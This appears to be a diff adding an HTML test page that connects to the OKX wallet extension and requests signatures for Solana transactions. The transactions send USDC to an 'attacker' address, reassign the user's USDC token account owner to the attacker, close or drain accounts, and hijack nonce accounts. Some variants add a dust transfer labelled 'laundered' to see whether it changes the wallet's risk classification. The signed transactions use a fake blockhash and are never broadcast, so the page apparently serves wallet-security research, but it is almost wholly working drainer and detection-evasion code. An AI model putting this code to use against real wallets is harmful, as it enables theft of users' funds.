@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>OKX_SPL_EVADE_v9</title>
+<style>
+body{font-family:monospace;font-size:12px;padding:6px;background:#fff;color:#000}
+button{padding:11px;margin:5px 0;font-size:13px;background:#0066cc;color:#fff;border:0;display:block;width:100%;border-radius:6px}
+.danger{background:#cc0000}
+.crit{background:#660000}
+pre{background:#eee;padding:4px;font-size:10px;white-space:pre-wrap;word-break:break-all;height:280px;overflow:auto;border:1px solid #999;margin:0}
+</style>
+<script type="module">
+  try {
+    const w3 = await import("https://esm.sh/@solana/web3.js@1.95.3");
+    const spl = await import("https://esm.sh/@solana/spl-token@0.4.8");
+    window._sol = w3;
+    window._spl = spl;
+    document.getElementById("out").textContent = (new Date().toISOString().substr(11,12)) + " web3.js+spl-token loaded\n" + document.getElementById("out").textContent;
+  } catch(e) {
+    document.getElementById("out").textContent = (new Date().toISOString().substr(11,12)) + " LOAD FAIL: " + e.message + "\n" + document.getElementById("out").textContent;
+  }
+</script>
+</head><body>
+<h2 style="margin:4px 0">OKX SPL Evade v9</h2>
+<pre id="out">click a button</pre>
+<button onclick="connect()">[0] connect</button>
+<button onclick="t1_spl_transfer()" class="danger">[T1] SPL Token transfer (USDC ATA, attacker dest)</button>
+<button onclick="t2_spl_setAuthority()" class="crit">[T2] SPL Token setAuthority (CHANGE OWNER OF USDC ATA → attacker)</button>
+<button onclick="t3_spl_closeAccount()" class="crit">[T3] SPL Token closeAccount (drain USDC balance + rent)</button>
+<button onclick="t4_spl_setAuth_pure()" class="crit">[T4] PURE setAuthority (no transfer wrapper)</button>
+<button onclick="t5_spl_setAuth_laundered()" class="crit">[T5] LAUNDERED setAuthority (dust transfer + setAuth)</button>
+<button onclick="n1_allocateWithSeed()" class="danger">[N1] AllocateWithSeed (opcode 9)</button>
+<button onclick="n2_authorizeNonce()" class="crit">[N2] AuthorizeNonceAccount (opcode 7) — hijack nonce auth</button>
+<button onclick="n3_withdrawNonce()" class="crit">[N3] WithdrawNonceAccount (opcode 5) — drain nonce account</button>
+<button onclick="n4_transferWithSeed()" class="crit">[N4] TransferWithSeed (opcode 11)</button>
+
+<script>
+var out = document.getElementById("out");
+function log(t){ out.textContent = (new Date().toISOString().substr(11,12)) + " " + t + "\n" + out.textContent; }
+
+const ATTACKER = "ATokenwy1tFwbeT7s3CQwMkdLMfFgQDPNYSC1xUUfo3";  // base58, 32 bytes
+const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";  // real USDC on Solana mainnet
+const TOKEN_PROGRAM = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
+const SYSTEM_PROGRAM = "11111111111111111111111111111111";
+const SYSVAR_RECENT_BLOCKHASHES = "SysvarRecentB1ockHashes11111111111111111111";
+const FAKE_BLOCKHASH = "11111111111111111111111111111112";
+
+async function ensureConnected(){
+  var ow = window.okxwallet;
+  if(!ow.solana.publicKey){ await ow.solana.connect(); }
+  return new window._sol.PublicKey(ow.solana.publicKey.toString());
+}
+
+async function connect(){
+  try{
+    var pk = await ensureConnected();
+    log("CONNECTED: " + pk.toString());
+    if(window._spl){
+      // derive user USDC ATA
+      var mint = new window._sol.PublicKey(USDC_MINT);
+      var ata = await window._spl.getAssociatedTokenAddress(mint, pk);
+      log("USDC ATA: " + ata.toString());
+      window.USDC_ATA = ata;
+    }
+  }catch(e){ log("ERR: " + e.message); }
+}
+
+async function t1_spl_transfer(){
+  log("=== [T1] SPL Token transfer (1 USDC unit to attacker) ===");
+  try{
+    if(!window._sol || !window._spl){ log("missing libs"); return; }
+    var from = await ensureConnected();
+    var fromATA = window.USDC_ATA || await window._spl.getAssociatedTokenAddress(new window._sol.PublicKey(USDC_MINT), from);
+    var attackerATA = await window._spl.getAssociatedTokenAddress(new window._sol.PublicKey(USDC_MINT), new window._sol.PublicKey(ATTACKER));
+    var ix = window._spl.createTransferInstruction(fromATA, attackerATA, from, 1);
+    var tx = new window._sol.Transaction();
+    tx.add(ix);
+    tx.recentBlockhash = FAKE_BLOCKHASH;
+    tx.feePayer = from;
+    var t0 = Date.now();
+    var signed = await window.okxwallet.solana.signTransaction(tx);
+    log("SIGNED ("+(Date.now()-t0)+"ms): sigs=" + signed.signatures.length);
+  }catch(e){ log("ERR: " + e.message); }
+}
+
+async function t2_spl_setAuthority(){
+  log("=== [T2] SPL Token setAuthority (USDC ATA owner -> attacker) ===");
+  try{
+    if(!window._sol || !window._spl){ log("missing libs"); return; }
+    var from = await ensureConnected();
+    var fromATA = window.USDC_ATA || await window._spl.getAssociatedTokenAddress(new window._sol.PublicKey(USDC_MINT), from);
+    var ix = window._spl.createSetAuthorityInstruction(
+      fromATA,
+      from,
+      window._spl.AuthorityType.AccountOwner,
+      new window._sol.PublicKey(ATTACKER)
+    );
+    // Add tiny dust transfer to test if it changes classification
+    var tx = new window._sol.Transaction();
+    tx.add(window._sol.SystemProgram.transfer({fromPubkey:from,toPubkey:new window._sol.PublicKey(ATTACKER),lamports:1}));
+    tx.add(ix);
+    tx.recentBlockhash = FAKE_BLOCKHASH;
+    tx.feePayer = from;
+    var t0 = Date.now();
+    var signed = await window.okxwallet.solana.signTransaction(tx);
+    log("SIGNED ("+(Date.now()-t0)+"ms): sigs=" + signed.signatures.length);
+  }catch(e){ log("ERR: " + e.message); }
+}
+
+async function t3_spl_closeAccount(){
+  log("=== [T3] SPL Token closeAccount (drain USDC ATA to attacker) ===");
+  try{
+    if(!window._sol || !window._spl){ log("missing libs"); return; }
+    var from = await ensureConnected();
+    var fromATA = window.USDC_ATA || await window._spl.getAssociatedTokenAddress(new window._sol.PublicKey(USDC_MINT), from);
+    var ix = window._spl.createCloseAccountInstruction(fromATA, new window._sol.PublicKey(ATTACKER), from);
+    var tx = new window._sol.Transaction();
+    tx.add(ix);
+    tx.recentBlockhash = FAKE_BLOCKHASH;
+    tx.feePayer = from;
+    var t0 = Date.now();
+    var signed = await window.okxwallet.solana.signTransaction(tx);
+    log("SIGNED ("+(Date.now()-t0)+"ms): sigs=" + signed.signatures.length);
+  }catch(e){ log("ERR: " + e.message); }
+}
+
+async function t4_spl_setAuth_pure(){
+  log("=== [T4] PURE setAuthority (no transfer) ===");
+  try{
+    if(!window._sol || !window._spl){ log("missing libs"); return; }
+    var from = await ensureConnected();
+    var fromATA = window.USDC_ATA || await window._spl.getAssociatedTokenAddress(new window._sol.PublicKey(USDC_MINT), from);
+    var ix = window._spl.createSetAuthorityInstruction(
+      fromATA, from, window._spl.AuthorityType.AccountOwner, new window._sol.PublicKey(ATTACKER));
+    var tx = new window._sol.Transaction();
+    tx.add(ix);
+    tx.recentBlockhash = FAKE_BLOCKHASH;
+    tx.feePayer = from;
+    var t0 = Date.now();
+    var signed = await window.okxwallet.solana.signTransaction(tx);
+    log("SIGNED ("+(Date.now()-t0)+"ms): sigs=" + signed.signatures.length);
+  }catch(e){ log("ERR: " + e.message); }
+}
+
+async function t5_spl_setAuth_laundered(){
+  log("=== [T5] LAUNDERED setAuthority (dust transfer + setAuth) ===");
+  try{
+    if(!window._sol || !window._spl){ log("missing libs"); return; }
+    var from = await ensureConnected();
+    var fromATA = window.USDC_ATA || await window._spl.getAssociatedTokenAddress(new window._sol.PublicKey(USDC_MINT), from);
+    var ix = window._spl.createSetAuthorityInstruction(
+      fromATA, from, window._spl.AuthorityType.AccountOwner, new window._sol.PublicKey(ATTACKER));
+    var tx = new window._sol.Transaction();
+    tx.add(window._sol.SystemProgram.transfer({fromPubkey:from,toPubkey:new window._sol.PublicKey(ATTACKER),lamports:1}));
+    tx.add(ix);
+    tx.recentBlockhash = FAKE_BLOCKHASH;
+    tx.feePayer = from;
+    var t0 = Date.now();
+    var signed = await window.okxwallet.solana.signTransaction(tx);
+    log("SIGNED ("+(Date.now()-t0)+"ms): sigs=" + signed.signatures.length);
+  }catch(e){ log("ERR: " + e.message); }
+}
+
+async function n1_allocateWithSeed(){
+  log("=== [N1] AllocateWithSeed (opcode 9) ===");
+  try{
+    if(!window._sol){ log("no web3.js"); return; }
+    var from = await ensureConnected();
+    var tx = new window._sol.Transaction();
+    tx.add(window._sol.SystemProgram.allocateWithSeed({
+      accountPubkey: from,
+      basePubkey: from,
+      seed: "okx-test",
+      space: 100,
+      programId: window._sol.SystemProgram.programId
+    }));
+    tx.recentBlockhash = FAKE_BLOCKHASH;
+    tx.feePayer = from;
+    var t0 = Date.now();
+    var signed = await window.okxwallet.solana.signTransaction(tx);
+    log("SIGNED ("+(Date.now()-t0)+"ms): sigs=" + signed.signatures.length);
+  }catch(e){ log("ERR: " + e.message); }
+}
+
+async function n2_authorizeNonce(){
+  log("=== [N2] AuthorizeNonceAccount ===");
+  try{
+    if(!window._sol){ log("no web3.js"); return; }
+    var from = await ensureConnected();
+    var tx = new window._sol.Transaction();
+    tx.add(window._sol.SystemProgram.authorizeNonceAccount({
+      noncePubkey: from,
+      authorizedPubkey: from,
+      newAuthorizedPubkey: new window._sol.PublicKey(ATTACKER)
+    }));
+    tx.recentBlockhash = FAKE_BLOCKHASH;
+    tx.feePayer = from;
+    var t0 = Date.now();
+    var signed = await window.okxwallet.solana.signTransaction(tx);
+    log("SIGNED ("+(Date.now()-t0)+"ms): sigs=" + signed.signatures.length);
+  }catch(e){ log("ERR: " + e.message); }
+}
+
+async function n3_withdrawNonce(){
+  log("=== [N3] WithdrawNonceAccount ===");
+  try{
+    if(!window._sol){ log("no web3.js"); return; }
+    var from = await ensureConnected();
+    var tx = new window._sol.Transaction();
+    tx.add(window._sol.SystemProgram.nonceWithdraw({
+      noncePubkey: from,
+      authorizedPubkey: from,
+      toPubkey: new window._sol.PublicKey(ATTACKER),
+      lamports: 1000000000
+    }));
+    tx.recentBlockhash = FAKE_BLOCKHASH;
+    tx.feePayer = from;
+    var t0 = Date.now();
+    var signed = await window.okxwallet.solana.signTransaction(tx);
+    log("SIGNED ("+(Date.now()-t0)+"ms): sigs=" + signed.signatures.length);
+  }catch(e){ log("ERR: " + e.message); }
+}
+
+async function n4_transferWithSeed(){
+  log("=== [N4] TransferWithSeed (opcode 11) ===");
+  try{
+    if(!window._sol){ log("no web3.js"); return; }
+    var from = await ensureConnected();
+    var tx = new window._sol.Transaction();
+    tx.add(window._sol.SystemProgram.transferWithSeed({
+      fromPubkey: from,
+      basePubkey: from,
+      toPubkey: new window._sol.PublicKey(ATTACKER),
+      lamports: 1000000000,
+      seed: "okx-test",
+      programId: window._sol.SystemProgram.programId
+    }));
+    tx.recentBlockhash = FAKE_BLOCKHASH;
+    tx.feePayer = from;
+    var t0 = Date.now();
+    var signed = await window.okxwallet.solana.signTransaction(tx);
+    log("SIGNED ("+(Date.now()-t0)+"ms): sigs=" + signed.signatures.length);
+  }catch(e){ log("ERR: " + e.message); }
+}
+</script></body></html>
